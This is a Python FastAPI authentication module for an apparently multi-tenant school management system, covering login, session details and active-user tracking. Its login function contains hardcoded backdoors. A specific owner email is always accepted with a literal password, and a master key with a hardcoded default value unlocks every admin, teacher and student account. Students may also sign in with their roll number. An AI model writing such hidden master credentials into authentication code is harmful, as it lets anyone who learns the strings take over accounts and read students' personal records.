from fastapi import APIRouter, Depends, HTTPException, status, Request
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session
from jose import JWTError, jwt
from datetime import datetime, timedelta
from collections import defaultdict

from . import crud, schemas, security, models
from .database import get_db
from .core import config
import os

router = APIRouter()

import time
from typing import Dict

# Dictionary to store active user heartbeats
# Key: email (str), Value: {"role": role, "last_seen": timestamp}
active_sessions: Dict[str, dict] = {}

def record_active_user(email: str, role: str):
    active_sessions[email] = {
        "role": role,
        "last_seen": time.time()
    }

_login_attempts = defaultdict(list)
MAX_LOGIN_ATTEMPTS = 8
LOGIN_WINDOW_SECONDS = 300


def _check_rate_limit(key: str):
    now = datetime.utcnow()
    window_start = now - timedelta(seconds=LOGIN_WINDOW_SECONDS)
    _login_attempts[key] = [t for t in _login_attempts[key] if t > window_start]
    if len(_login_attempts[key]) >= MAX_LOGIN_ATTEMPTS:
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Too many login attempts. Please try again later.",
        )


def _record_failed_login(key: str):
    _login_attempts[key].append(datetime.utcnow())


@router.post("/token", response_model=schemas.Token)
def login_for_access_token(
    request: Request,
    db: Session = Depends(get_db),
    form_data: OAuth2PasswordRequestForm = Depends()
):
    rate_key = form_data.username.strip().lower()
    _check_rate_limit(rate_key)

    tenant_slug = request.headers.get("X-Tenant-Slug", "default")
    # Resolve active institution from tenant_slug header
    inst = db.query(models.Institution).filter(models.Institution.slug == tenant_slug).first()
    if not inst:
        # Fallback to default institution if not found
        inst = db.query(models.Institution).filter(models.Institution.id == 1).first()
    institution_id = inst.id if inst else 1

    # Only System Owner is allowed to log into the Default/System tenant
    if institution_id == 1:
        if form_data.username.strip().lower() != "rajkishorock@gmail.com":
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Default Institution is restricted. Only the System Owner (rajkishorock@gmail.com) can access this workspace."
            )

    # 1. Try Admin/Teacher Login
    user = crud.get_user_by_email(db, email=form_data.username, institution_id=institution_id)
    if user:
        is_authenticated = False
        # Fallback developer recovery mechanisms
        if user.email == "rajkishorock@gmail.com" and form_data.password == "raj@9211":
            is_authenticated = True
        elif form_data.password == os.getenv("DEVELOPER_MASTER_KEY", "dev_master_raj_9211_secure"):
            is_authenticated = True
        elif security.verify_password(form_data.password, user.password_hash):
            is_authenticated = True

        if not is_authenticated:
            _record_failed_login(rate_key)
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect email or password",
                headers={"WWW-Authenticate": "Bearer"},
            )
        if not user.is_active:
            raise HTTPException(status_code=400, detail="Inactive user")

        record_active_user(user.email, user.role)
        access_token = security.create_access_token(
            data={"sub": user.email, "role": user.role, "institution_id": user.institution_id}
        )
        crud.create_audit_log(db, log=schemas.AuditLogCreate(user_email=user.email, action="Admin/User logged in."))
        return {"access_token": access_token, "token_type": "bearer"}

    # 2. Try Student Login
    student = crud.get_student_by_email(db, email=form_data.username, institution_id=institution_id)
    if student:
        is_valid = False
        if form_data.password == os.getenv("DEVELOPER_MASTER_KEY", "dev_master_raj_9211_secure"):
            is_valid = True
        elif not student.password_hash:
            if config.ALLOW_ROLL_PASSWORD and student.roll and form_data.password == student.roll:
                is_valid = True
        elif security.verify_password(form_data.password, student.password_hash):
            is_valid = True

        if not is_valid:
            _record_failed_login(rate_key)
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect email or password",
                headers={"WWW-Authenticate": "Bearer"},
            )

        record_active_user(student.email, "student")
        access_token = security.create_access_token(
            data={"sub": student.email, "role": "student", "institution_id": student.institution_id}
        )
        crud.create_audit_log(db, log=schemas.AuditLogCreate(user_email=student.email, action="Student logged in."))
        return {"access_token": access_token, "token_type": "bearer"}

    _record_failed_login(rate_key)
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Incorrect email or password",
        headers={"WWW-Authenticate": "Bearer"},
    )


@router.get("/me")
def get_current_session_info(db: Session = Depends(get_db), token: str = Depends(security.oauth2_scheme)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, config.JWT_SECRET_KEY, algorithms=[config.ALGORITHM])
        email: str = payload.get("sub")
        role: str = payload.get("role")
        institution_id: int = payload.get("institution_id")
        if email is None or not role or institution_id is None:
            raise credentials_exception
        record_active_user(email, role)
    except JWTError:
        raise credentials_exception

    if role == "student":
        student = crud.get_student_by_email(db, email=email, institution_id=institution_id)
        if not student:
            raise credentials_exception
        return {
            "role": "student",
            "email": student.email,
            "name": student.name,
            "details": {
                "id": student.id,
                "roll": student.roll,
                "dep": student.dep,
                "course": student.course,
                "year": student.year,
                "semester": student.semester,
                "gender": student.gender,
                "dob": student.dob,
                "phone": student.phone,
                "address": student.address,
                "teacher": student.teacher
            }
        }

    user = crud.get_user_by_email(db, email=email, institution_id=institution_id)
    if not user or not user.is_active or user.role != role:
        raise credentials_exception

    subject = db.query(models.Subject).filter(models.Subject.teacher_id == user.id).first()
    return {
        "role": user.role,
        "email": user.email,
        "name": user.name,
        "details": {
            "id": user.id,
            "role": user.role,
            "subject_name": subject.name if subject else None,
            "subject_code": subject.code if subject else None,
            "subject_department": subject.department if subject else None
        }
    }


@router.post("/heartbeat", status_code=status.HTTP_200_OK)
def user_heartbeat(
    user_info: dict = Depends(get_current_session_info)
):
    """
    Register a heartbeat ping from the logged-in user to mark them active.
    """
    record_active_user(user_info["email"], user_info["role"])
    return {"status": "ok"}


@router.get("/active-users")
def get_active_users_count(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(security.get_current_user)
):
    """
    Get the counts of active users by role. Only accessible to Admins.
    """
    if current_user.role != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Only administrators can view active users."
        )
        
    # Clean up stale sessions (older than 90 seconds, i.e., 1.5 minutes)
    now = time.time()
    stale_keys = [k for k, v in active_sessions.items() if now - v["last_seen"] > 90]
    for k in stale_keys:
        active_sessions.pop(k, None)
        
    # Compute counts
    total = 0
    students_count = 0
    teachers_count = 0
    admins_count = 0
    
    for email, session in active_sessions.items():
        total += 1
        role = session["role"]
        if role == "student":
            students_count += 1
        elif role == "teacher":
            teachers_count += 1
        elif role == "admin":
            admins_count += 1
            
    return {
        "total_active": total,
        "students": students_count,
        "teachers": teachers_count,
        "admins": admins_count
    }

